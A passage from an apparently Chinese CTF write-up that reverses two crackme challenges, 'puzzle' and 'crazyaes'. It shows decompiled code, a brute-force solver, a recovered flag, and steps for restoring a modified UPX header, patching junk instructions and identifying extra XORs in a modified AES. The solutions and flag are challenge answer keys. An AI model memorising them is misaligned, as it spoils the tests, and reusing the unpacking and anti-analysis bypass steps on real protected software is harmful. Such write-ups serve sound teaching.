class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">num2ch</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  LOBYTE(a1) = a1 ^ <span class="hljs-number">0x8D</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(a1 - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0xFE</span> )<br>    bad_input(a1, a2, a3);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)a1;<br>&#125;<br></code></pre></td></tr></table></figure><p>若字符不为<code>ab-</code>，<code>parse</code>返回</p><p><code>parse</code>对应的算法如下(这里使用列表代替链表，方向相反)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">s:<span class="hljs-built_in">str</span></span>):<br>    i = <span class="hljs-number">1</span><br>    ls = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;a&#x27;</span>):<br>            i *= <span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> (c == <span class="hljs-string">&#x27;b&#x27;</span>):<br>            <span class="hljs-keyword">assert</span>((i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>))<br>            i = (i - <span class="hljs-number">1</span>) // <span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> (c == <span class="hljs-string">&#x27;-&#x27;</span>):<br>            deep = <span class="hljs-built_in">len</span>(ls)<br>            new_c = (i + deep) ^ <span class="hljs-number">0x8D</span><br>            ls.append(new_c)<br>            i = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>动态调试获取校验链表<code>l1</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">.bss:00005D849CA5F300 ; l1<br>.bss:00005D849CA5F300 _ZL2l1          db 49h                  ; DATA XREF: main+<span class="hljs-number">97</span>↑o<br>.bss:00005D849CA5F300                                         ; _GLOBAL__sub_I__Z9bad_inputv+9B↑w<br>.bss:00005D849CA5F301                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F308 qword_5D849CA5F308 dq 5D849CA5F310h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+A2↑w<br>.bss:00005D849CA5F310 ; l2<br>.bss:00005D849CA5F310 _ZL2l2          db 53h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+5B↑o<br>.bss:00005D849CA5F310                                         ; _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">94</span>↑w<br>.bss:00005D849CA5F311                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F318 qword_5D849CA5F318 dq 5D849CA5F320h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">54</span>↑w<br>.bss:00005D849CA5F320 ; l3<br>.bss:00005D849CA5F320 _ZL2l3          db 43h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+4D↑o<br>.bss:00005D849CA5F320                                         ; _GLOBAL__sub_I__Z9bad_inputv+8D↑w<br>.bss:00005D849CA5F321                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F328 qword_5D849CA5F328 dq 5D849CA5F330h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">46</span>↑w<br>.bss:00005D849CA5F330 ; l4<br>.bss:00005D849CA5F330 _ZL2l4          db 43h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+3F↑o<br>.bss:00005D849CA5F330                                         ; _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">86</span>↑w<br>.bss:00005D849CA5F331                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F338 qword_5D849CA5F338 dq 5D849CA5F340h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">38</span>↑w<br>.bss:00005D849CA5F340 ; l5<br>.bss:00005D849CA5F340 _ZL2l5          db 32h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">31</span>↑o<br>.bss:00005D849CA5F340                                         ; _GLOBAL__sub_I__Z9bad_inputv+7F↑w<br>.bss:00005D849CA5F341                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F348 qword_5D849CA5F348 dq 5D849CA5F350h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+2A↑w<br>.bss:00005D849CA5F350 ; l6<br>.bss:00005D849CA5F350 _ZL2l6          db 30h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">23</span>↑o<br>.bss:00005D849CA5F350                                         ; _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">78</span>↑w<br>.bss:00005D849CA5F351                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F358 qword_5D849CA5F358 dq 5D849CA5F360h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+1C↑w<br>.bss:00005D849CA5F360 ; l7<br>.bss:00005D849CA5F360 _ZL2l7          db 32h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">7</span>↑w<br>.bss:00005D849CA5F360                                         ; _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">15</span>↑o<br>.bss:00005D849CA5F361                 align <span class="hljs-number">8</span><br>.bss:00005D849CA5F368 qword_5D849CA5F368 dq 5D849CA5F370h     ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+E↑w<br>.bss:00005D849CA5F370 ; l8<br>.bss:00005D849CA5F370 _ZL2l8          dq 34h                  ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv↑o<br>.bss:00005D849CA5F370                                         ; _GLOBAL__sub_I__Z9bad_inputv+<span class="hljs-number">62</span>↑w<br>.bss:00005D849CA5F378 qword_5D849CA5F378 dq <span class="hljs-number">0</span>                 ; DATA XREF: _GLOBAL__sub_I__Z9bad_inputv+6D↑w<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ans_ls = [<span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>]<br></code></pre></td></tr></table></figure><p>需要计算每个值对应的字符串输入，由于逆推难度较大，考虑使用递归暴力计算</p><p>计算逻辑中存在<code>(i-1)//3</code>的操作，因此实际计算的最大值可能远大于<code>0x100</code>，此处选择<code>100000</code>，保留最短输入字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">ans_ls = [<span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>]<br>ls = [(ans_ls[i] ^ <span class="hljs-number">0x8D</span>) - i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br><br>parse_ls = [<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recur</span>(<span class="hljs-params">k, s</span>):<br>    <span class="hljs-keyword">if</span> (k &gt; <span class="hljs-number">100000</span>):<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">global</span> parse_ls<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> (parse_ls[k] == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(s) &lt; <span class="hljs-built_in">len</span>(parse_ls[k])):<br>            parse_ls[k] = s<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        recur(k*<span class="hljs-number">2</span>, s+<span class="hljs-string">&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">if</span> ((k % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (k % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            recur((k-<span class="hljs-number">1</span>)//<span class="hljs-number">3</span>, s+<span class="hljs-string">&#x27;b&#x27;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>recur(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i), parse_ls[i])<br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> ls:<br>    <span class="hljs-built_in">print</span>(parse_ls[d], end=<span class="hljs-string">&#x27;-&#x27;</span>)<br></code></pre></td></tr></table></figure><p>爆破得到正确的输入字符串，得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./puzzle<br>Enter your magic code: aaaabaaabaababaaababaaaababaababaaabaababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaaaabababababa-aaaabaaabaababaaababaaaabaaabababaaababaabab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaababababaa-aaaabaaabaababaaababaaaaba-aaaaaaaaaabababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababababaababaaa-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababaaab <br><br>Congratulations! Your flag is: flag&#123;W0w_U_Ar3_V3ry_G00d_A7_C0unt1n9_3c968eb5d72c3dca&#125;<br><br></code></pre></td></tr></table></figure><h2 id="crazyaes"><a href="#crazyaes" class="headerlink" title="crazyaes"></a>crazyaes</h2><p>PE文件头表示被修改，手动恢复</p><p><img src="assets/2024-05-31-11-19-25-image.png"></p><p>UPX加壳，将PPP0和PPP1还原为UPX0和UPX1，<code>upx -d</code>脱壳</p><p><del>比赛中没注意到里面的UPX表示，用x64dbg手动脱的，没符号还没法调</del></p><p><img src="assets/2024-05-31-11-21-12-image.png"></p><p><img src="assets/2024-05-31-11-21-36-image.png"></p><p>有几处花指令手动修复下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">.text:0043B4CF             loc_43B4CF:                             ; CODE XREF: _main_0+FB↑j<br>.text:0043B4CF <span class="hljs-number">74</span> 03       jz      short near ptr loc_43B4D3+<span class="hljs-number">1</span><br>.text:0043B4CF<br>.text:0043B4D1 <span class="hljs-number">75</span> 01       jnz     short near ptr loc_43B4D3+<span class="hljs-number">1</span><br>.text:0043B4D1<br>.text:0043B4D3<br>.text:0043B4D3             loc_43B4D3:                             ; CODE XREF: _main_0:loc_43B4CF↑j<br>.text:0043B4D3                                                     ; _main_0+<span class="hljs-number">111</span>↑j<br>.text:0043B4D3 E8 <span class="hljs-number">68</span> <span class="hljs-number">00</span> E0+call    near ptr 4B23B540h<br></code></pre></td></tr></table></figure><p>main里面输入输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-130h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+0h] [ebp-130h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+0h] [ebp-130h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-60h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-54h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+E8h] [ebp-48h]</span><br>  <span class="hljs-type">char</span> v10; <span class="hljs-comment">// [esp+F7h] [ebp-39h]</span><br>  <span class="hljs-type">char</span> encrypted[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+100h] [ebp-30h] BYREF</span><br>  <span class="hljs-type">char</span> ans[<span class="hljs-number">20</span>]; <span class="hljs-comment">// [esp+118h] [ebp-18h]</span><br><br>  ans[<span class="hljs-number">0</span>] = <span class="hljs-number">-76</span>;<br>  ans[<span class="hljs-number">1</span>] = <span class="hljs-number">56</span>;<br>  ans[<span class="hljs-number">2</span>] = <span class="hljs-number">54</span>;<br>  ans[<span class="hljs-number">3</span>] = <span class="hljs-number">48</span>;<br>  ans[<span class="hljs-number">4</span>] = <span class="hljs-number">30</span>;<br>  ans[<span class="hljs-number">5</span>] = <span class="hljs-number">104</span>;<br>  ans[<span class="hljs-number">6</span>] = <span class="hljs-number">72</span>;<br>  ans[<span class="hljs-number">7</span>] = <span class="hljs-number">87</span>;<br>  ans[<span class="hljs-number">8</span>] = <span class="hljs-number">81</span>;<br>  ans[<span class="hljs-number">9</span>] = <span class="hljs-number">1</span>;<br>  ans[<span class="hljs-number">10</span>] = <span class="hljs-number">-73</span>;<br>  ans[<span class="hljs-number">11</span>] = <span class="hljs-number">3</span>;<br>  ans[<span class="hljs-number">12</span>] = <span class="hljs-number">-101</span>;<br>  ans[<span class="hljs-number">13</span>] = <span class="hljs-number">-104</span>;<br>  ans[<span class="hljs-number">14</span>] = <span class="hljs-number">-29</span>;<br>  ans[<span class="hljs-number">15</span>] = <span class="hljs-number">126</span>;<br>  <span class="hljs-built_in">memset</span>(encrypted, <span class="hljs-number">17</span>, <span class="hljs-number">15</span>);<br>  encrypted[<span class="hljs-number">15</span>] = <span class="hljs-number">1</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>((<span class="hljs-type">int</span>)&amp;unk_4A2114, v4);<br>  <span class="hljs-keyword">while</span> ( v10 != <span class="hljs-number">10</span> )<br>  &#123;<br>    v10 = getchar();<br>    flag[v9++] = v10;<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )<br>    encrypted[i] = flag[i];<br>  aes_encrypt(<span class="hljs-number">0</span>, encrypted, <span class="hljs-number">16</span>, &amp;aes_key);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x10</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( encrypted[j] != ans[j] )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;wrong!!!&quot;</span>, v5);<br>      Sleep(<span class="hljs-number">0x1388</span>u);<br>      j___loaddll(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;WOW!!!&quot;</span>, v5);<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;\n&quot;</span>, v6);<br>&#125;<br></code></pre></td></tr></table></figure><p>标准的aes解密出来是错误的，应该是魔改了奇怪的东西</p><p>aes加密在<code>add_round_key</code>后面多了一轮异或操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">aes_encrypt</span><span class="hljs-params">(<span class="hljs-type">int</span> _0, <span class="hljs-type">int</span> data, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> key)</span><br>&#123;<br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> m; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> n; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-140h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [esp+E8h] [ebp-134h]</span><br>  <span class="hljs-type">char</span> xor_box[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+F4h] [ebp-128h]</span><br>  <span class="hljs-type">int</span> state[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+10Ch] [ebp-110h] BYREF</span><br>  <span class="hljs-type">char</span> expaned_key[<span class="hljs-number">244</span>]; <span class="hljs-comment">// [esp+124h] [ebp-F8h] BYREF</span><br><br>  j__memset(expaned_key, <span class="hljs-number">0</span>, <span class="hljs-number">0xF0</span>u);<br>  <span class="hljs-built_in">memset</span>(state, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>  xor_box[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  xor_box[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>  xor_box[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>  xor_box[<span class="hljs-number">3</span>] = <span class="hljs-number">3</span>;<br>  xor_box[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>  xor_box[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  xor_box[<span class="hljs-number">6</span>] = <span class="hljs-number">3</span>;<br>  xor_box[<span class="hljs-number">7</span>] = <span class="hljs-number">2</span>;<br>  xor_box[<span class="hljs-number">8</span>] = <span class="hljs-number">2</span>;<br>  xor_box[<span class="hljs-number">9</span>] = <span class="hljs-number">3</span>;<br>  xor_box[<span class="hljs-number">10</span>] = <span class="hljs-number">0</span>;<br>  xor_box[<span class="hljs-number">11</span>] = <span class="hljs-number">1</span>;<br>  xor_box[<span class="hljs-number">12</span>] = <span class="hljs-number">3</span>;<br>  xor_box[<span class="hljs-number">13</span>] = <span class="hljs-number">2</span>;<br>  xor_box[<span class="hljs-number">14</span>] = <span class="hljs-number">1</span>;<br>  xor_box[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br>  aes_key_expansion(_0, key, expaned_key);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; i += <span class="hljs-number">4</span> * <span class="hljs-number">4</span>[_0] )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * <span class="hljs-number">4</span>[_0]; ++j )<br>      *((_BYTE *)state + j) = *(_BYTE *)(data + j + i);<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">10</span>[_0]; ++k )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( k &gt; <span class="hljs-number">0</span> )<br>      &#123;<br>        sub_bytes(_0, state);<br>        shift_rows(_0, state);<br>        <span class="hljs-keyword">if</span> ( k &lt; <span class="hljs-number">10</span>[_0] )<br>          mix_columns(_0, state);<br>      &#125;<br>      add_round_key(_0, state, expaned_key, k);<br>      <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">4</span> * <span class="hljs-number">4</span>[_0]; ++m )<br>        *((_BYTE *)state + m) ^= xor_box[m];<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt; <span class="hljs-number">4</span> * <span class="hljs-number">4</span>[_0]; ++n )<br>      *(_BYTE *)(data + n + i) = *((_BYTE *)state + n);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>S盒代换后多了一个异或<code>0xA1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_43AAA0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-14h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-8h]</span><br><br>  __CheckForDebuggerJustMyCode(&amp;unk_4B20F4);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = a1;<br>    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">4</span>[a1] )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j )<br>    &#123;<br>      *(_BYTE *)(a2 + j + <span class="hljs-number">4</span> * i) = sub_434D0B(*(_BYTE *)(a2 + j + <span class="hljs-number">4</span> * i));<br>      *(_BYTE *)(a2 + j + <span class="hljs-number">4</span> * i) ^= <span class="hljs-number">0xA1</span>u;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>列混合后多了一个异或<code>0x54</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">sub_43A530</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// bl</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+DCh] [ebp-44h]</span><br>  <span class="hljs-type">int</span> m; <span class="hljs-comment">// [esp+DCh] [ebp-44h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [esp+E8h] [ebp-38h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+F4h] [ebp-2Ch]</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+100h] [ebp-20h]</span><br>  <span class="hljs-type">char</span> v8[<span class="hljs-number">20</span>]; <span class="hljs-comment">// [esp+10Ch] [ebp-14h]</span><br><br>  v8[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>  v8[<span class="hljs-number">1</span>] = <span class="hljs-number">3</span>;<br>  v8[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">5</span>] = <span class="hljs-number">2</span>;<br>  